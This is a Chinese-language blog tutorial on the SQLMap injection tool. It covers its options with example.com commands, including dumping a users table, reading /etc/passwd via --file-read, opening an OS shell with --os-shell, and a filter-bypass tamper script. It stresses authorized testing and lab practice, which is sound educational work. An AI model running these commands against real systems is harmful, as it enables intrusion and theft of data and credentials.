---
title: SQLMap
date: 2025-01-07 17:23:15
categories:
  - 安全学习
tags:
  - SQLMap
  - Web安全
  - SQL注入
---

SQLMap 是一款开源的自动化 SQL 注入检测与利用工具，常用于授权场景下的 Web 安全测试。它可以帮助安全研究人员快速判断目标参数是否存在 SQL 注入风险，并进一步枚举数据库、表结构或验证漏洞影响。

<!-- more -->

## 工具定位

SQLMap 的核心价值在于自动化。它会根据目标响应尝试不同的注入技术，并给出较明确的检测结果。常见能力包括：

- 识别 GET、POST、Cookie 等位置的可疑参数。
- 支持布尔盲注、时间盲注、报错注入、联合查询注入等技术。
- 支持 MySQL、PostgreSQL、Oracle、SQL Server 等常见数据库。
- 可以枚举数据库、表、列，并在授权测试中导出数据。

使用这类工具时要注意边界：只在自己拥有授权的系统、靶场或实验环境中测试。

## 基本用法

最常见的命令格式如下：

```bash
sqlmap [选项] -u <目标URL>
```

其中 `-u` 用来指定目标 URL，其他选项用于控制请求数据、数据库类型、测试强度和结果输出。

## 常用参数

### 目标指定

`-u` 用来指定目标 URL。

```bash
sqlmap -u "http://example.com/page?id=1"
```

`--data` 用于 POST 请求，指定提交的数据。

```bash
sqlmap -u "http://example.com/login" --data="username=admin&password=123"
```

`--cookie` 用于指定 Cookie，适合需要登录态的页面。

```bash
sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=123456"
```

### 数据库相关

`--dbms` 用来指定数据库类型，可以减少无关探测。

```bash
sqlmap -u "http://example.com/page?id=1" --dbms=mysql
```

`--dbs` 用来枚举数据库。

```bash
sqlmap -u "http://example.com/page?id=1" --dbs
```

`-D` 指定数据库名，`--tables` 枚举该数据库中的表。

```bash
sqlmap -u "http://example.com/page?id=1" -D my_database --tables
```

`-T` 指定表名，`--columns` 枚举字段。

```bash
sqlmap -u "http://example.com/page?id=1" -D my_database -T users --columns
```

`--dump` 用来导出数据。这个操作影响较大，只能在授权环境中使用。

```bash
sqlmap -u "http://example.com/page?id=1" -D my_database -T users --dump
```

### 注入技术与测试强度

`--technique` 可以限定测试技术，例如 `B` 表示布尔盲注，`T` 表示时间盲注，`E` 表示报错注入，`U` 表示联合查询注入。

```bash
sqlmap -u "http://example.com/page?id=1" --technique=B
```

`--level` 控制测试等级，数值越高测试面越广。

```bash
sqlmap -u "http://example.com/page?id=1" --level=3
```

`--risk` 控制测试风险，数值越高可能发送更有影响的 payload。

```bash
sqlmap -u "http://example.com/page?id=1" --risk=2
```

### 文件、命令与代理

`--file-read` 用于读取服务器文件，属于高影响操作。

```bash
sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"
```

`--os-shell` 尝试获取系统交互式 Shell，只能在明确授权的测试中使用。

```bash
sqlmap -u "http://example.com/page?id=1" --os-shell
```

`--proxy` 通过代理发送请求，便于配合 Burp Suite 等工具观察流量。

```bash
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

`--output-dir` 指定结果保存目录。

```bash
sqlmap -u "http://example.com/page?id=1" --output-dir=/tmp/sqlmap_output
```

## 示例场景

检测 URL 参数是否可能存在 SQL 注入：

```bash
sqlmap -u "http://example.com/page?id=1"
```

枚举目标数据库：

```bash
sqlmap -u "http://example.com/page?id=1" --dbs
```

导出指定表的数据：

```bash
sqlmap -u "http://example.com/page?id=1" -D my_database -T users --dump
```

测试 POST 请求参数：

```bash
sqlmap -u "http://example.com/login" --data="username=admin&password=123"
```

使用 tamper 脚本尝试绕过过滤规则：

```bash
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment
```

## 学习提醒

SQLMap 很适合帮助理解 SQL 注入的检测流程，但不要只停留在“会跑命令”。更好的学习方式是：

- 在靶场中对比手工注入和 SQLMap 自动化结果。
- 观察不同参数下请求包和响应包的变化。
- 理解每种注入技术成立的前提。
- 把工具输出整理成漏洞验证报告，而不是直接复制命令结果。
